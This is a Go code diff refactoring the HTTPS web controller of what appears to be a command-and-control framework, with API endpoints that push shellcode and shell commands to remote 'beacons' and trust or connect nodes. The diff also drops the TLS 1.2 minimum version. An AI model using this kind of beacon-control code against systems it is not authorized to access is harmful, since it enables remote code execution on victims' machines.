@@ -3,8 +3,6 @@ package controller
 import (
 	"context"
 	"crypto/tls"
-	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -13,7 +11,6 @@ import (
 	"sync"
 	"time"
 
-	"github.com/axgle/mahonia"
 	"github.com/gorilla/csrf"
 	"github.com/gorilla/sessions"
 	"github.com/gorilla/websocket"
@@ -26,7 +23,7 @@ import (
 	"project/internal/crypto/rand"
 	"project/internal/guid"
 	"project/internal/logger"
-	"project/internal/messages"
+	"project/internal/patch/json"
 	"project/internal/xpanic"
 )
 
@@ -47,7 +44,7 @@ type web struct {
 func newWeb(ctx *Ctrl, config *Config) (*web, error) {
 	cfg := config.Web
 
-	// load CA certificate
+	// load CA certificate and generate temporary certificate
 	certFile, err := ioutil.ReadFile(cfg.CertFile)
 	if err != nil {
 		return nil, errors.WithStack(err)
@@ -64,25 +61,26 @@ func newWeb(ctx *Ctrl, config *Config) (*web, error) {
 	if err != nil {
 		return nil, errors.WithStack(err)
 	}
-
-	// generate temporary certificate
 	pair, err := cert.Generate(caCert, caPri, &cfg.CertOpts)
 	if err != nil {
 		return nil, errors.WithStack(err)
 	}
 
+	// configure handler.
 	wh := webHandler{ctx: ctx}
 	wh.upgrader = &websocket.Upgrader{
 		HandshakeTimeout: time.Minute,
 		ReadBufferSize:   4096,
 		WriteBufferSize:  4096,
 	}
+	wh.encoderPool.New = func() interface{} {
+		return json.NewEncoder(64)
+	}
 	// configure router
 	router := &httprouter.Router{
 		RedirectTrailingSlash:  true,
 		RedirectFixedPath:      true,
 		HandleMethodNotAllowed: true,
-		HandleOPTIONS:          true,
 		PanicHandler:           wh.handlePanic,
 	}
 	// resource
@@ -105,13 +103,18 @@ func newWeb(ctx *Ctrl, config *Config) (*web, error) {
 	router.GET("/", func(w hRW, _ *hR, _ hP) {
 		_, _ = w.Write(index)
 	})
-	// register router about API
-	router.POST("/api/login", wh.handleLogin)
-	router.POST("/api/load_key", wh.handleLoadKey)
-	router.POST("/api/node/trust", wh.handleTrustNode)
-	router.POST("/api/node/connect", wh.handleConnectNodeListener)
-	router.POST("/api/beacon/shellcode", wh.handleShellcode)
-	router.POST("/api/beacon/single_shell", wh.handleSingleShell)
+	// register router
+	for path, handler := range map[string]httprouter.Handle{
+		"/api/login":               wh.handleLogin,
+		"/api/load_key":            wh.handleLoadKey,
+		"/api/node/trust":          wh.handleTrustNode,
+		"/api/node/confirm_trust":  wh.handleConfirmTrustNode,
+		"/api/node/connect":        wh.handleConnectNode,
+		"/api/beacon/shellcode":    wh.handleShellCode,
+		"/api/beacon/single_shell": wh.handleSingleShell,
+	} {
+		router.POST(path, handler)
+	}
 
 	// configure HTTPS server
 	listener, err := net.Listen(cfg.Network, cfg.Address)
@@ -126,7 +129,6 @@ func newWeb(ctx *Ctrl, config *Config) (*web, error) {
 	tlsConfig := &tls.Config{
 		Rand:         rand.Reader,
 		Time:         ctx.global.Now,
-		MinVersion:   tls.VersionTLS12,
 		Certificates: []tls.Certificate{pair.TLSCertificate()},
 	}
 	web.server = &http.Server{
@@ -146,17 +148,19 @@ func (web *web) Deploy() error {
 	go func() {
 		defer func() {
 			if r := recover(); r != nil {
-				b := xpanic.Print(r, "web.server.ServeTLS")
+				b := xpanic.Print(r, "web.Deploy")
 				web.ctx.logger.Print(logger.Fatal, "web", b)
 			}
 			web.wg.Done()
 		}()
 		errChan <- web.server.ServeTLS(web.listener, "", "")
 	}()
+	timer := time.NewTimer(time.Second)
+	defer timer.Stop()
 	select {
 	case err := <-errChan:
 		return errors.WithStack(err)
-	case <-time.After(time.Second):
+	case <-timer.C:
 		return nil
 	}
 }
@@ -175,7 +179,8 @@ func (web *web) Close() {
 type webHandler struct {
 	ctx *Ctrl
 
-	upgrader *websocket.Upgrader
+	upgrader    *websocket.Upgrader
+	encoderPool sync.Pool
 }
 
 func (wh *webHandler) Close() {
@@ -190,7 +195,7 @@ func (wh *webHandler) log(lv logger.Level, log ...interface{}) {
 	wh.ctx.logger.Println(lv, "web", log...)
 }
 
-func (wh *webHandler) handlePanic(w hRW, r *hR, e interface{}) {
+func (wh *webHandler) handlePanic(w hRW, _ *hR, e interface{}) {
 	w.WriteHeader(http.StatusInternalServerError)
 
 	// if is super user return the panic
@@ -201,7 +206,37 @@ func (wh *webHandler) handlePanic(w hRW, r *hR, e interface{}) {
 	fmt.Println(string(hash), err)
 }
 
-func (wh *webHandler) handleLogin(w hRW, r *hR, p hP) {
+type webError struct {
+	Error string `json:"error"`
+}
+
+func (wh *webHandler) writeError(w hRW, err error) {
+	w.WriteHeader(http.StatusOK)
+	e := webError{}
+	if err != nil {
+		e.Error = err.Error()
+	}
+	encoder := wh.encoderPool.Get().(*json.Encoder)
+	defer wh.encoderPool.Put(encoder)
+	data, err := encoder.Encode(e)
+	if err != nil {
+		panic(err)
+	}
+	_, _ = w.Write(data)
+}
+
+func (wh *webHandler) writeResponse(w hRW, response interface{}) {
+	w.WriteHeader(http.StatusOK)
+	encoder := wh.encoderPool.Get().(*json.Encoder)
+	defer wh.encoderPool.Put(encoder)
+	data, err := encoder.Encode(response)
+	if err != nil {
+		panic(err)
+	}
+	_, _ = w.Write(data)
+}
+
+func (wh *webHandler) handleLogin(w hRW, r *hR, _ hP) {
 	// upgrade to websocket connection, server can push message to client
 	conn, err := wh.upgrader.Upgrade(w, r, nil)
 	if err != nil {
@@ -211,135 +246,123 @@ func (wh *webHandler) handleLogin(w hRW, r *hR, p hP) {
 	_ = conn.Close()
 }
 
-func (wh *webHandler) handleLoadKey(w hRW, r *hR, p hP) {
-	// TODO size, check is load session key
+func (wh *webHandler) handleLoadKey(_ hRW, _ *hR, _ hP) {
+	// size, check is loaded session key
 	// if isClosed{
 	//  return
 	// }
 }
 
-func (wh *webHandler) handleTrustNode(w hRW, r *hR, p hP) {
-	m := &mTrustNode{}
-	err := json.NewDecoder(r.Body).Decode(m)
-	if err != nil {
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-	listener := bootstrap.NewListener(m.Mode, m.Network, m.Address)
-	nnr, err := wh.ctx.TrustNode(context.TODO(), listener)
-	if err != nil {
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-	fmt.Printf("node guid: %X\n", nnr.GUID)
-	err = wh.ctx.ConfirmTrustNode(context.TODO(), nnr.ID)
-	if err != nil {
-		_, _ = w.Write([]byte(err.Error()))
-	} else {
-		_, _ = w.Write([]byte("trust node successfully"))
-	}
+// -------------------------------------------trust node-------------------------------------------
+
+type webTrustNode struct {
+	Mode    string `json:"mode"`
+	Network string `json:"network"`
+	Address string `json:"address"`
 }
 
-func (wh *webHandler) handleConnectNodeListener(w hRW, r *hR, p hP) {
-	m := &mConnectNodeListener{}
-	err := json.NewDecoder(r.Body).Decode(m)
+func (wh *webHandler) handleTrustNode(w hRW, r *hR, _ hP) {
+	tn := webTrustNode{}
+	err := json.NewDecoder(r.Body).Decode(&tn)
 	if err != nil {
-		_, _ = w.Write([]byte(err.Error()))
+		wh.writeError(w, err)
 		return
 	}
-	nodeGUIDData, err := hex.DecodeString(m.GUID)
+	listener := bootstrap.NewListener(tn.Mode, tn.Network, tn.Address)
+	nnr, err := wh.ctx.TrustNode(r.Context(), listener)
 	if err != nil {
-		_, _ = w.Write([]byte(err.Error()))
+		wh.writeError(w, err)
 		return
 	}
-	nodeGUID := new(guid.GUID)
-	err = nodeGUID.Write(nodeGUIDData)
-	if err != nil {
-		panic(err.Error())
-	}
-	listener := bootstrap.NewListener(m.Mode, m.Network, m.Address)
-	err = wh.ctx.sender.Synchronize(context.Background(), nodeGUID, listener)
-	if err != nil {
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-	_, _ = w.Write([]byte("connect node listener successfully"))
+	wh.writeResponse(w, nnr)
 }
 
-func (wh *webHandler) handleShellcode(w hRW, r *hR, p hP) {
-	_ = r.ParseForm()
-	beaconGUID := guid.GUID{}
+// ---------------------------------------confirm trust node---------------------------------------
 
-	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
-	if err != nil {
-		fmt.Println("1", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-	err = beaconGUID.Write(beaconGUIDSlice)
-	if err != nil {
-		fmt.Println("2", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-	sc, err := hex.DecodeString(r.FormValue("shellcode"))
-	if err != nil {
-		fmt.Println("3", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
-	shellcode := messages.ExecuteShellCode{
-		Method:    r.FormValue("method"),
-		ShellCode: sc,
-	}
-	err = wh.ctx.SendToBeacon(context.Background(),
-		&beaconGUID, messages.CMDBExecuteShellCode, &shellcode, true)
-	if err != nil {
-		fmt.Println("4", err)
-		_, _ = w.Write([]byte(err.Error()))
-		return
-	}
+type webConfirmTrustNode struct {
+	ID string `json:"id"`
 }
 
-func (wh *webHandler) handleSingleShell(w hRW, r *hR, p hP) {
-	_ = r.ParseForm()
-	beaconGUID := guid.GUID{}
-
-	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
+func (wh *webHandler) handleConfirmTrustNode(w hRW, r *hR, _ hP) {
+	ctn := webConfirmTrustNode{}
+	err := json.NewDecoder(r.Body).Decode(&ctn)
 	if err != nil {
-		fmt.Println("1", err)
-		_, _ = w.Write([]byte(err.Error()))
+		wh.writeError(w, err)
 		return
 	}
+	err = wh.ctx.ConfirmTrustNode(context.TODO(), ctn.ID)
+	wh.writeError(w, err)
+}
 
-	err = beaconGUID.Write(beaconGUIDSlice)
+// ------------------------------------------connect node------------------------------------------
+
+type webConnectNode struct {
+	GUID    guid.GUID `json:"guid"`
+	Mode    string    `json:"mode"`
+	Network string    `json:"network"`
+	Address string    `json:"address"`
+}
+
+func (wh *webHandler) handleConnectNode(w hRW, r *hR, _ hP) {
+	cn := webConnectNode{}
+	err := json.NewDecoder(r.Body).Decode(&cn)
 	if err != nil {
-		fmt.Println("2", err)
-		_, _ = w.Write([]byte(err.Error()))
+		wh.writeError(w, err)
 		return
 	}
-
-	shell := messages.SingleShell{
-		Command: r.FormValue("cmd"),
-	}
-
-	reply, err := wh.ctx.SendToBeaconRT(context.Background(), &beaconGUID,
-		messages.CMDBSingleShell, &shell, true, 15*time.Second)
+	listener := bootstrap.NewListener(cn.Mode, cn.Network, cn.Address)
+	err = wh.ctx.Synchronize(r.Context(), &cn.GUID, listener)
 	if err != nil {
-		fmt.Println("2", err)
-		_, _ = w.Write([]byte(err.Error()))
+		wh.writeError(w, err)
 		return
 	}
+	wh.writeError(w, nil)
+}
 
-	decoderName := r.FormValue("decoder")
-	decoder := mahonia.NewDecoder(decoderName)
-	if decoder == nil {
-		_, _ = w.Write([]byte("invalid decoder: " + decoderName))
+// -------------------------------------------shellcode--------------------------------------------
+
+type webShellCode struct {
+	GUID    guid.GUID     `json:"guid"`
+	Method  string        `json:"method"`
+	Data    hexByteSlice  `json:"data"`
+	Timeout time.Duration `json:"timeout"`
+}
+
+func (wh *webHandler) handleShellCode(w hRW, r *hR, _ hP) {
+	sc := webShellCode{}
+	err := json.NewDecoder(r.Body).Decode(&sc)
+	if err != nil {
+		wh.writeError(w, err)
 		return
 	}
-	output := reply.(*messages.SingleShellOutput)
-	_, _ = w.Write([]byte(decoder.ConvertString(string(output.Output))))
-	if output.Err != "" {
-		_, _ = w.Write([]byte(output.Err))
+	err = wh.ctx.ShellCode(r.Context(), &sc.GUID, sc.Method, sc.Data, sc.Timeout)
+	wh.writeError(w, err)
+}
+
+// ------------------------------------------single shell------------------------------------------
+
+type webSingleShellRequest struct {
+	GUID    guid.GUID     `json:"guid"`
+	Command string        `json:"command"`
+	Decoder string        `json:"decoder"`
+	Timeout time.Duration `json:"timeout"`
+}
+
+type webSingleShellResponse struct {
+	Output string `json:"output"`
+}
+
+func (wh *webHandler) handleSingleShell(w hRW, r *hR, _ hP) {
+	sr := webSingleShellRequest{}
+	err := json.NewDecoder(r.Body).Decode(&sr)
+	if err != nil {
+		wh.writeError(w, err)
+		return
 	}
+	output, err := wh.ctx.SingleShell(r.Context(), &sr.GUID, sr.Command, sr.Decoder, sr.Timeout)
+	if err != nil {
+		wh.writeError(w, err)
+		return
+	}
+	wh.writeResponse(w, &webSingleShellResponse{Output: string(output)})
 }
